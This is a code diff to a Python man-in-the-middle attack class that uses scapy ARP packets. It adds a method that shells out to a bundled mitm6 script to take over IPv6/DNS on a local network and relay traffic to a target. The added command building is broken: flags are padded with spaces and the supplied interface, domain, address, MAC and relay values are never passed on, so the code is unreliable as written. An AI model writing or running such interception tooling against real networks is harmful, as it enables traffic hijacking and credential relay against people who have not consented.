@@ -1,4 +1,6 @@
 import netifaces
+import subprocess
+import os
 import ipaddress
 from scapy.all import ARP, Ether, sendp
 import logging
@@ -50,6 +52,31 @@ class MITMAttack:
                 time.sleep(2)  # Add sleep to prevent overloading the network
         except KeyboardInterrupt:
             logging.info("\nMITM Attack Stopped.")
+
+    def mitm(
+        self,
+        interface=None,
+        localdomain=None,
+        ipv4=None,
+        ipv6=None,
+        mac=None,
+        relay_target=None,
+    ):
+        logging.info(
+            "Attacking {} with packets from {}...".format(interface, ipv4 or ipv6)
+        )
+        path_to_executable = os.path.join(os.path.dirname(__file__), "mitm6.py")
+        command = [
+            "python3",
+            path_to_executable,
+            " --interface " if interface else "",
+            " --localdomain " if localdomain else "",
+            " --ipv4 " if ipv4 else "",
+            " --ipv6 " if ipv6 else "",
+            " --mac " if mac else "",
+            " --relay " if relay_target else "",
+        ]
+        subprocess.run(command)
 
 
 if __name__ == "__main__":
